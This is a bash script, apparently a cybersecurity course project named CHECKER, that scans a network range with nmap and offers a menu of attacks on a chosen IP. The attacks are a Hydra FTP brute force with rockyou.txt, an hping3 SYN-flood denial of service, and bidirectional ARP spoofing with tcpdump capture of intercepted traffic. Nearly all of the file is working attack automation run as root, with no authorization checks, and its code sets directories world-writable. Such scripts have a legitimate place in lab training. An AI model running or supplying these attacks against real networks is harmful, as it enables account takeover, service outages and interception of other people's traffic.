#!/bin/bash


# Projectname and creator:
# Cyber-Security PROJECT: CHECKER
# Creator of the project: Hadroxx



# Define color variables
RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
WHITE='\e[37m'
RESET='\e[0m'


# Start of project

function START()
{
	 # Checking if the current user is root
if [ "$(whoami)" != "root" ]
	then
		echo -e "${RED}[!] Must be root to run, exiting now...${RESET}"
	exit
    else
        echo -e "${GREEN}[!] You are root, continuing.${RESET}"
fi

# Switch to Norwegian keyboard layout (this can be removed if you have an English keyboard-layout, or changed if you have other keyboard-layouts)
echo
setxkbmap no
echo -e "${GREEN}[*] Switched to Norwegian keyboard layout.${RESET}"
sleep 1
echo


read -p "[?] Do you wish to update KALI before continuing the script? (y/n): " reply
    if [[ "$reply" == "Y" || "$reply" == "y" ]]
    then
	echo -e "${RED}Initiating KALI LINUX Update. This may take some time..."
	sudo apt-get update -y >/dev/null 2>&1
    echo -e "${GREEN}KALI updated! Now continuing the script...${RESET}"
	else
	echo -e "${GREEN}[*] No update initiated! Continuing with the script..${RESET}"
    fi	
      
}


function INPUT()
{
echo -e "${BLUE}[*] To properly run this script, please input the following:${RESET}"
    echo
    sleep 1
      # Loop until a valid network range is provided.
      while true
      do
      read -p "[*] Enter the desired network-range to scan (example: 8.8.8.8/24): " NETWORK
      echo
      
      # Validating the network range with nmap
      nmap $NETWORK -sL 2>./ValidNetwork.txt 1>./NetworkScan.txt
      
      # Checking to see if "failed to resolve" is in the output
      if grep -i "failed to resolve" ./ValidNetwork.txt # The file needed to be "grepped" is the ValidNetwork.txt because in here lies the error-messages (the 2> output)
      then
      echo -e "${RED}[!] Network-range is invalid. Please input the correct network-range.${RESET}"
      echo
      else
      echo -e "${GREEN}[*] Network-range is valid. Continuing the script...${RESET}"
      break # Exit the loop and continue the script
      fi
      done

	echo
    sleep 1
    read -p "[*] Enter a name for the directory to save all output inside: " DIRECTORY
    echo
    sleep 1
    
	echo -e "${GREEN}[*] Directory created: ./$DIRECTORY${RESET} "
	mkdir ./$DIRECTORY
	chmod 777 ./$DIRECTORY # The reason I do chmod 777 here is simply to avoid possible issues regarding permissions later on.
	mv ./ValidNetwork.txt ./NetworkScan.txt ./$DIRECTORY # Here I'm just moving the .txt files into the newly created directory, so everything is in the same place at the end.
	echo
	
	echo
	sleep 1

	read -p "[*] Enter a name for the log file (it will be saved under /var/log/<name>.log): " LOGNAME
	LOGFILE="/var/log/${LOGNAME}.log"
	touch "$LOGFILE"
	chmod 644 "$LOGFILE" # Here I do chmod 644 so the owner can read/write, but others can read only.
	echo
	sleep 1
	echo -e "${GREEN}[*] Log file created: $LOGFILE${RESET}"
	export LOGFILE
	echo
	
	# Prompting the user to choose a password list, defaulting to Rockyou if none is specified.

read -p "Do you wish to supply your own PASSWORD list (defaulting to rockyou.txt if no list is supplied)? (y/n) " REPLY

if [[ $REPLY == "Y" || $REPLY == "y" ]]; then
    while true; do
        read -p "Input the path to your file (example: /home/kali/Desktop/FILE): " PASSLIST
        if [[ -f "$PASSLIST" ]]; then
            echo
            echo -e "${GREEN}[*] Password list set to: $PASSLIST${RESET}"
            echo
            break  # Exit loop if valid file is provided
        else
			echo
            echo -e "${RED}[!] File not found. Please input a valid file path.${RESET}"
            echo
        fi
    done
else
    echo
    sleep 1
    echo -e "${YELLOW}[*] No custom password list supplied. Using /home/kali/Desktop/rockyou.txt${RESET}"
    PASSLIST="/home/kali/Desktop/rockyou.txt"
    echo
fi

export PASSLIST  # PASSLIST is exported globally

# Username-list promp, defaulting to Rockyou if none is specified.

read -p "Do you wish to supply your own USERLIST (defaulting to rockyou.txt if no list is supplied)? (y/n) " REPLY

if [[ $REPLY == "Y" || $REPLY == "y" ]]; then
    while true; do
        read -p "Input the path to your file (example: /home/kali/Desktop/FILE): " USERLIST
        if [[ -f "$USERLIST" ]]; then
            echo
            echo -e "${GREEN}[*] Userlist set to: $USERLIST${RESET}"
            echo
            break  # Exit loop if valid file is provided
        else
            echo
            echo -e "${RED}[!] File not found. Please input a valid file path.${RESET}"
            echo
        fi
    done
else
    echo
    sleep 1
    echo -e "${YELLOW}[*] No custom userlist supplied. Using /home/kali/Desktop/rockyou.txt${RESET}"
    USERLIST="/home/kali/Desktop/rockyou.txt"
    echo
fi

export USERLIST  # USERLIST is exported globally
	
}


function SCAN()
{
	echo
	# Initiating a scan to grab the live IPs on the network-range for further scanning, enumeration and exploitation
	echo -e "${BLUE}[*] Initiating a general NMAP --open scan to scan the network for live IPS. This may take some time...${RESET}"
	echo
	# To avoid too much clutter/output on the terminal-screen I chose to send the output to dev/null.
	nmap $NETWORK --open 2>/dev/null | tee ./$DIRECTORY/OPENPORT_output.txt
	echo -e "${GREEN}[*] Open-port scan complete, output saved to OPENPORT_output.txt in $DIRECTORY."
	echo
	echo "Saving all the following found IP-addresses to IPS.txt: "
	grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' ./$DIRECTORY/OPENPORT_output.txt | tee ./$DIRECTORY/IPS.txt
	echo
	echo -e "[*] Identifying the GATEWAY: "
	ip route | grep default | awk '{print $3}' | tee ./$DIRECTORY/DHCP_IP_output.txt
	echo
	echo -e "Scan complete. Continuing the script...${RESET}"
	#The command for IP-addresses is not one I remember by heart, so I just got it from ChatGPT
	echo
	
	
	# Variable for looping through the IP-addresses from the IPS.txt to use in future scans.
	IPS=$(grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' ./$DIRECTORY/IPS.txt)
	export IPS # Making IPS a global variable
}


function HYDRA()
{ 
	echo "[*] Preparing for HYDRA Brute Force Attack."
	echo
	echo "[*] Creating HYDRA Directory."
	mkdir ./HYDRA
	chmod 777 ./HYDRA
	mv ./HYDRA ./$DIRECTORY
	echo
	echo "[*] HYDRA directory made and moved into $DIRECTORY."
	echo
	sleep 2
	echo
	echo
	echo -e "${RED}[*] ----------Initiating HYDRA Brute Force Attack---------- [*]${RESET}"
	echo
	hydra -L $USERLIST -P $PASSLIST ftp://$TARGET | tee ./$DIRECTORY/HYDRA/${TARGET}_BF_output.txt
	echo
	echo -e "${GREEN}[!] ----------HYDRA Brute Force Attack Completed---------- [!]${RESET}"
	echo
	echo "[$(date '+%Y-%m-%d %H:%M:%S')] HYDRA Brute Force attack executed on $TARGET" >> "$LOGFILE"
	echo
}

function HPING()
{
	echo "[*] Preparing for HPING (DOS) Attack."
	echo
	echo "[*] Creating DOS directory."
	mkdir ./HPING
	chmod 777 ./HPING
	mv ./HPING ./$DIRECTORY
	echo
	echo "[*] DOS directory made and moved into $DIRECTORY."
	echo
	sleep 2
	echo
	echo
	echo -e "${RED}[*] ----------Initiating HPING (DOS) Attack---------- [*]${RESET}"
	echo
	hping3 -S --flood -V $TARGET > ./$DIRECTORY/HPING/${TARGET}_DOS_output.txt 2>&1 &
	HPING_PID=$!
	echo
	echo -e "${GREEN}[!] HPING3 attack started in background (PID $HPING_PID).${RESET}"
	echo
	tcpdump -i $INTERFACE host $TARGET and tcp -w ./$DIRECTORY/HPING/${TARGET}_traffic_capture.pcap >/dev/null 2>&1 &
	TCPDUMP_PID=$!
	echo
	echo -e "${GREEN}[*] Tcpdump launched to observe DOS packets (in background) (PID $TCPDUMP_PID). Capturing to .pcap file in ${DIRECTORY}/HPING.${RESET}"
	echo
	echo -e "${GREEN}[!] ----------HPING (DOS) Attack Completed---------- [!]${RESET}"
	echo
	echo "[$(date '+%Y-%m-%d %H:%M:%S')] DOS (HPING3 SYN Flood) attack executed on $TARGET" >> "$LOGFILE"
	echo

}

function ARPSPOOF()
{
	ETH0=$(hostname -I)
	echo
	echo "[*] Preparing for ARP (MITM) Attack."
	echo
	read -p "$(echo -e "${YELLOW}[?] Input Gateway IP: ${RESET}")" GATEWAY
	echo
	echo "Creating ARP Directories"
	mkdir ./ARP
	chmod 777 ./ARP
	mv ./ARP ./$DIRECTORY
	echo
	echo "[*] ARP directory made and moved into $DIRECTORY."
	echo
	sleep 2
	echo
	echo
	echo -e "${RED}[*] ----------Initiating ARP Attack---------- [*]${RESET}"
	echo
	echo "[*] Enabling IP forwarding..."
	echo 1 > /proc/sys/net/ipv4/ip_forward
	
	 # Start ARP spoofing in both directions (victim ↔ gateway)
	 # Tells the gateway the user is the target
    xterm -hold -e "arpspoof -i $INTERFACE -t $GATEWAY $TARGET | tee ./$DIRECTORY/ARP/gateway_spoof_output.txt" &
    ARP1_PID=$!
    
	# Tells the target the user is the gateway
    xterm -hold -e "arpspoof -i $INTERFACE -t $TARGET $GATEWAY | tee ./$DIRECTORY/ARP/target_spoof_output.txt" &
    ARP2_PID=$!

    echo
    echo -e "${GREEN}[*] ARPSPOOF running in two terminals (Gateway ↔ Target). PIDs: $ARP1_PID and $ARP2_PID${RESET}"

    # Optional: capture MITM traffic with tcpdump
    tcpdump -i $INTERFACE host $TARGET or host $GATEWAY -c 100 -w ./$DIRECTORY/ARP/${TARGET}_mitm_capture.pcap >/dev/null 2>&1 &
    TCPDUMP_PID=$!
    echo -e "${GREEN}[*] Tcpdump capturing MITM traffic to ${DIRECTORY}/ARP/${TARGET}_mitm_capture.pcap (PID $TCPDUMP_PID)${RESET}"
    echo
    
	echo -e "${GREEN}[!] ----------ARP Attack Completed---------- [!]${RESET}"
	echo
	echo "[$(date '+%Y-%m-%d %H:%M:%S')] ARP-Spoofing (MITM) attack executed on $TARGET (Gateway: $GATEWAY)" >> "$LOGFILE"
	echo

}	


function MENU()
{
        echo
        read -p "$(echo -e "${YELLOW}[?] Please choose the target IP you wish to attack: ${RESET}")" TARGET
        export TARGET
        echo
        echo "Here are the pre-made attacks to choose from:"
        echo
        echo "Choose an attack, or choose exit to continue the script."
    while true; do
        echo
        echo -e "${YELLOW}1) HYDRA Brute Force: Attempts to brute force FTP login using user/pass lists.${RESET}"
        echo -e "${YELLOW}2) Denial-Of-Service (HPING3): Sends SYN flood to overwhelm the system.${RESET}"
        echo -e "${YELLOW}3) ARP-Spoofing: Redirects traffic between victim and gateway (MITM).${RESET}"
        echo -e "${RED}4) Exit Attack Menu and continue the script.${RESET}"
        echo

        read -p "$(echo -e "${YELLOW}[?] Choose an attack to run, or choose exit to continue the script (1-4): ${RESET}")" CHOICE
        echo

        case $CHOICE in
            1) HYDRA ;;
            2) HPING ;;
            3) ARPSPOOF ;;
            4) echo -e "${GREEN}[*] Exiting attack menu...${RESET}"; break ;;
            *) echo -e "${RED}[!] Invalid choice. Please select 1, 2, 3, or 4.${RESET}" ;;
        esac
    done
}

function LOG()
{
	echo -e "${YELLOW}[*] Attack details logged to: $LOGFILE${RESET}"
	echo
	echo -e "${GREEN}Now displaying contents of the $LOGFILE:"
	echo
	cat $LOGFILE
	echo
	echo -e "${GREEN}Now Displaying the contents of the created directory $DIRECTORY: "
	echo
	ls -la ./$DIRECTORY/*
	echo -e "Project ended.${RESET}"
}




echo -e "${YELLOW}[*]--------------------START OF PROJECT--------------------[*]${RESET}"
echo
START
echo
echo -e "${YELLOW}[*]--------------------INPUT--------------------[*]${RESET}"
echo
INPUT
echo
echo -e "${YELLOW}[*]--------------------SCAN-------------------[*]${RESET}"
echo
SCAN
echo
echo -e "${YELLOW}[*]--------------------MENU--------------------[*]${RESET}"
echo
MENU
echo
echo -e "${YELLOW}[*]--------------------LOG--------------------[*]${RESET}"
echo
LOG
echo
echo -e "${YELLOW}[*]--------------------END OF PROJECT--------------------[*]${RESET}"



